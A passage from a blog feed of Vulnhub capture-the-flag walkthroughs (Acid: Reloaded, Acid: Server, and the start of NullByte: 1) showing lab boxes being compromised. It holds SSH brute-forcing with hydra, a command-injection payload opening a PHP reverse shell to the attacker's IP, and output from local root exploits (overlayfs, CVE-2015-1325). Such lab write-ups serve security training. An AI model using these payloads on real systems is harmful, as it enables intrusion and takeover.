</span><span class='line'>[*] performance_schema
</span><span class='line'>[*] secure_login
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>Database: secure_login                                                                                                                                                             
</span><span class='line'>[4 tables]
</span><span class='line'>+-----------------+
</span><span class='line'>| UB3R/strcpy.exe |
</span><span class='line'>| login_attempts  |
</span><span class='line'>| members         |
</span><span class='line'>| word            |
</span><span class='line'>+-----------------+
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>from the SQL injection exploit, I found <code>UB3R/strcpy.exe</code> which is interesting. Then I downloaded the binary file from <code>http://10.1.1.139:33447/UB3R/strcpy.exe</code>. By checking the file, I found there are some other files hidden in <code>strcpy.exe</code>, so I use <code>foremost</code> to recover them</p>

<p>keep the same steps as above until we found the file <code>Avinash.contact</code> which is a XML file and there is a string is base64 encoded. Then I decoded it and got <code>NooB@123</code></p>

<p>Then I created a dictionary file based on the names/keywords in file <code>Avinash.contact</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# cat dict.txt 
</span><span class='line'>Avinash
</span><span class='line'>avinash
</span><span class='line'>Makke
</span><span class='line'>makke
</span><span class='line'>acid
</span><span class='line'>acid.exploit
</span><span class='line'>acid.exploit@gmail.com
</span><span class='line'>NooB@123</span></code></pre></td></tr></table></div></figure>


<p>Then I use hydra with the file dict.txt to brute force SSH login, and found <code>makke/NooB@123</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# hydra -L dict.txt -P dict.txt 10.1.1.139 ssh -s 22
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-09-11 08:49:26
</span><span class='line'>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
</span><span class='line'>[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 64 login tries (l:8/p:8), ~0 tries per task
</span><span class='line'>[DATA] attacking service ssh on port 22
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>[22][ssh] host: 10.1.1.139   login: makke   password: NooB@123
</span><span class='line'>1 of 1 target successfully completed, 2 valid passwords found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-09-11 08:49:46</span></code></pre></td></tr></table></div></figure>


<p>Login to the SSH with makke&rsquo;s login</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# ssh makke@10.1.1.139 
</span><span class='line'>    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
</span><span class='line'>   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
</span><span class='line'>  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
</span><span class='line'> / ___ \ |___ | || |_| |_____|  _ &lt;| |___| |__| |_| / ___ \| |_| | |___| |_| |
</span><span class='line'>/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
</span><span class='line'>
</span><span class='line'>                                  -by Acid
</span><span class='line'>
</span><span class='line'>Wanna Knock me out ??? 
</span><span class='line'>3.2.1 Let's Start the Game.
</span><span class='line'>                                                                              
</span><span class='line'>makke@10.1.1.139's password: 
</span><span class='line'>Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>134 packages can be updated.
</span><span class='line'>80 updates are security updates.
</span><span class='line'>
</span><span class='line'>Last login: Thu Sep 10 17:10:50 2015 from 10.1.1.130
</span><span class='line'>makke@acid:~$ id
</span><span class='line'>uid=1001(makke) gid=1001(makke) groups=1001(makke)
</span><span class='line'>makke@acid:~$ ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:bb:6e:b3  
</span><span class='line'>          inet addr:10.1.1.139  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:febb:6eb3/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:312455 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:319819 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000 
</span><span class='line'>          RX bytes:53077085 (53.0 MB)  TX bytes:41973680 (41.9 MB)
</span><span class='line'>          Interrupt:19 Base address:0x2000 
</span><span class='line'>
</span><span class='line'>lo        Link encap:Local Loopback  
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:3026 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:3026 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0 
</span><span class='line'>          RX bytes:301825 (301.8 KB)  TX bytes:301825 (301.8 KB)
</span><span class='line'>
</span><span class='line'>makke@acid:~$</span></code></pre></td></tr></table></div></figure>


<p>Poking around and found clues in file <code>.bash_history</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -ah
</span><span class='line'>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hint  .profile
</span><span class='line'>makke@acid:~$ ls -ahl
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
</span><span class='line'>drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
</span><span class='line'>-rw------- 1 makke makke  272 Sep 10 17:13 .bash_history
</span><span class='line'>-rw-r--r-- 1 makke makke  220 Aug 24 19:11 .bash_logout
</span><span class='line'>-rw-r--r-- 1 makke makke 3.7K Aug 24 19:11 .bashrc
</span><span class='line'>drwx------ 2 makke makke 4.0K Aug 24 21:25 .cache
</span><span class='line'>-rw-rw-r-- 1 makke makke   40 Aug 24 21:28 .hint
</span><span class='line'>-rw-r--r-- 1 makke makke  675 Aug 24 19:11 .profile
</span><span class='line'>makke@acid:~$ cat .bash_history
</span><span class='line'>exit
</span><span class='line'>cd ..
</span><span class='line'>clear
</span><span class='line'>cd /
</span><span class='line'>ls
</span><span class='line'>cd bin/
</span><span class='line'>clear
</span><span class='line'>./overlayfs 
</span><span class='line'>clear
</span><span class='line'>cd /home/makke/
</span><span class='line'>clear
</span><span class='line'>nano .hint
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>ls -a
</span><span class='line'>cat .hint 
</span><span class='line'>clear
</span><span class='line'>cd /bin/
</span><span class='line'>ls
</span><span class='line'>./overlayfs 
</span><span class='line'>clear
</span><span class='line'>wgt
</span><span class='line'>wget
</span><span class='line'>apt-get remove wget
</span><span class='line'>su
</span><span class='line'>su -
</span><span class='line'>exit
</span><span class='line'>id
</span><span class='line'>pwd
</span><span class='line'>ls
</span><span class='line'>ls -l
</span><span class='line'>pwd
</span><span class='line'>ls -alh
</span><span class='line'>cat .bash_history
</span><span class='line'>/bin/overlayfs 
</span><span class='line'>exit
</span><span class='line'>makke@acid:~$ cat .bash_history</span></code></pre></td></tr></table></div></figure>


<p>From the output above, there is an executable file <code>/bin/overlayfs</code> which is overlayfs local root exploit file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -al /bin/overlayfs 
</span><span class='line'>-rwxr-xr-x 1 root root 12236 Aug 24 21:22 /bin/overlayfs</span></code></pre></td></tr></table></div></figure>


<p>run it and ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ /bin/overlayfs 
</span><span class='line'>spawning threads
</span><span class='line'>mount #1
</span><span class='line'>mount #2
</span><span class='line'>child threads done
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1001(makke)
</span><span class='line'># cd root
</span><span class='line'>sh: 2: cd: can't cd to root
</span><span class='line'># cd /root
</span><span class='line'># ls -al
</span><span class='line'>total 68
</span><span class='line'>drwx------  5 root root  4096 Aug 24 21:32 .
</span><span class='line'>drwxr-xr-x 22 root root  4096 Aug 24 20:58 ..
</span><span class='line'>-rw-------  1 root root 23934 Aug 24 22:25 .bash_history
</span><span class='line'>-rw-r--r--  1 root root  3135 Aug  8 18:02 .bashrc
</span><span class='line'>drwx------  2 root root  4096 Aug 24 17:46 .cache
</span><span class='line'>drwx------  3 root root  4096 Aug  6 17:55 .config
</span><span class='line'>drwx------  3 root root  4096 Aug  6 15:51 .dbus
</span><span class='line'>-rw-r--r--  1 root root   284 Aug 24 20:57 .flag.txt
</span><span class='line'>-rw-------  1 root root  2775 Aug 24 21:32 .mysql_history
</span><span class='line'>-rw-------  1 root root   147 Aug 24 23:32 .nano_history
</span><span class='line'>-rw-r--r--  1 root root   140 Feb 20  2014 .profile
</span><span class='line'>-rw-r--r--  1 root root    66 Aug  6 17:31 .selected_editor
</span><span class='line'># cat .flag.txt
</span><span class='line'>Dear Hax0r,
</span><span class='line'>
</span><span class='line'>You have completed the Challenge Successfully.
</span><span class='line'>
</span><span class='line'>Your Flag is : "Black@Current@Ice-Cream"
</span><span class='line'>
</span><span class='line'>Kind & Best Regards
</span><span class='line'>
</span><span class='line'>-ACiD
</span><span class='line'>
</span><span class='line'>Twitter:https://twitter.com/m_avinash143
</span><span class='line'>Facebook: https://www.facebook.com/M.avinash143
</span><span class='line'>LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Acid: Server]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server/"/>
    <updated>2015-09-03T05:36:37-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server</id>
    <content type="html"><![CDATA[<p>Acid:Server is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-server,125/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/138178348?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Hints stored in some pages' source code or title, otherwise dirbuster/wfuzz can be used to find hidden folders</li>
<li>Command injection vulnerability exists in <code>/Challenge/Magic_Box/command.php</code>, exploit it can obtain a reverse shell</li>
<li>Apport/Ubuntu - Local Root Race Condition exploit (CVE-2015-1325) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden folder and a page which has command injection vulnerability, analyse it with burp suite and exploit it to get a reverse shell</li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1325, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.132 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.132    00:0c:29:36:7b:18   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:fb:ea:26   VMware, Inc.</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.132 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -H -msf -p 1-65535 -Iv -T4 10.1.1.132
</span><span class='line'>adding 10.1.1.132/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:14028 -> 10.1.1.132:33447
</span><span class='line'>TCP open 10.1.1.132:33447  ttl 64
</span><span class='line'>sender statistics 291.2 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131074 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open           unknown[33447]     from 10.1.1.132  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>From the result above, TCP port 33447 has been discovered.</p>

<p>Then I run NMAP scan to probe more detail information against the opening port.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Host is up (0.00029s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>|_http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Ubuntu)
</span><span class='line'>|_http-title: /Challenge
</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure>


<p>I found that apache 2.4.10 is running on port 33447, and the server OS is Ubuntu Linux.</p>

<p>Then I start up the firefox to have a close look the web application and found hidden path from title or dirbuster scan or decode the password on the bottom of source code.</p>

<p>The hidden folder is <code>/Challenge</code></p>

<p>Then I keep using <code>dirbuster</code> to <code>/Challenge/</code> folder and found some pages, one of them is <code>cake.php</code> which again, the title give us the clue to another hidden folder <code>/Magic_Box</code></p>

<p>Keep running <code>dirbuster</code> to <code>/Challenge/Magic_Box</code> folder and found interesting php page <code>command.php</code> which has command injection vulnerability</p>

<p>Then by using <code>burp proxy</code> and tamper the request to exploit command injection vulnerability to get a shell, due to there is no <code>wget</code> in the target server, I use the following php command:</p>

<p>payload (the payload need to be <font color="red">URL encoded</font>):</p>

<p><code>127.0.0.1; php -r '$sock=fsockopen("10.1.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>

<p>Setting up <code>NC</code> to listen on port 4444, then send the payload to server and got a reverse shell with <code>www-data</code> limited privilege.</p>

<p>Then running some enumeration and poking around, I found the target server is Ubuntu 15.04, which is local privilege escape vulnerable to <code>CVE-2015-1325</code></p>

<p>Compile and send the exploit to target server, then run it to get ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/tmp$ ./37088
</span><span class='line'>./37088
</span><span class='line'>created /var/crash/_bin_sleep.33.crash
</span><span class='line'>crasher: my pid is 2571
</span><span class='line'>apport stopped, pid = 2572
</span><span class='line'>getting pid 2571
</span><span class='line'>current pid = 2570..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
</span><span class='line'>** child: current pid = 2571
</span><span class='line'>** child: executing /bin/su
</span><span class='line'>Password: sleeping 2s..
</span><span class='line'>
</span><span class='line'>checker: mode 4516
</span><span class='line'>waiting for file to be unlinked..writing to fifo
</span><span class='line'>fifo written.. wait...
</span><span class='line'>waiting for /etc/sudoers.d/core to appear..
</span><span class='line'>success
</span><span class='line'># id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'># python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>  ____                            _         _       _   _                 
</span><span class='line'> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
</span><span class='line'>| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
</span><span class='line'>| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
</span><span class='line'> \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
</span><span class='line'>                  |___/                                                   
</span><span class='line'>root@acid:/tmp# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@acid:~# ls
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'>root@acid:~# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Dear Hax0r,
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You have successfully completed the challenge.
</span><span class='line'>
</span><span class='line'>I  hope you like it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>FLAG NAME: "Acid@Makke@Hax0r"
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Kind & Best Regards
</span><span class='line'>
</span><span class='line'>-ACID
</span><span class='line'>facebook: https://facebook.com/m.avinash143
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>root@acid:~#</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]NullByte: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/"/>
    <updated>2015-08-18T09:12:46-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1</id>
    <content type="html"><![CDATA[<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/nullbyte1/main.png"></p>

<p>NullByte challenge 0x01</p>

<p>Difficulty is Basic to intermediate.</p>

<p>&ldquo;Use your lateral thinking skills, maybe you’ll need to write some code.&rdquo; &ndash; <font color="green">ly0n</font> (<a href="http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/">http://ly0n.me/2015/08/01/nullbyte-challenge-0x01/</a>)</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.130/24</em>)</p>

<p>Target: NullByte: 1 (<em>10.10.10.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Found hidden information in picture and open the hidden path</li>
<li>Weak passwords used in Web login form, the password can be found by brute-force attacking</li>
<li>SQL injection vulnerability found in username searching page</li>
<li>Exploit SQL injection vulnerability to get user credentials, also can get a limited shell</li>
<li>Found user ramses with Base64 encoded MD5 password which can be cracked easily and SSH login as ramses</li>
<li>Mis-configuration program which has setuid set and did not use full path inside of system call. Exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirb</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Download picture from index.html and reveal the hidden information stored in it</li>
<li>Found the hidden folder and a login page which has comment saying that the password is simple</li>
<li>Use hydra with rockyou.txt to burte force crack the login password [<font color="FF8000">THC Hydra</font>]</li>
<li>The next username searching page is SQL injection vulnerable, exploit it to downlaod system sensitive file, login credentials and also get a limited shell [<font color="FF8000">sqlmap</font>]</li>
<li>Crack user ramses&rsquo;s password and ssh login to get a better shell</li>
<li>System enumeration and Exploit vulnerable program with setuid bit set to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://dirb.sourceforge.net/">dirb</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.134 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
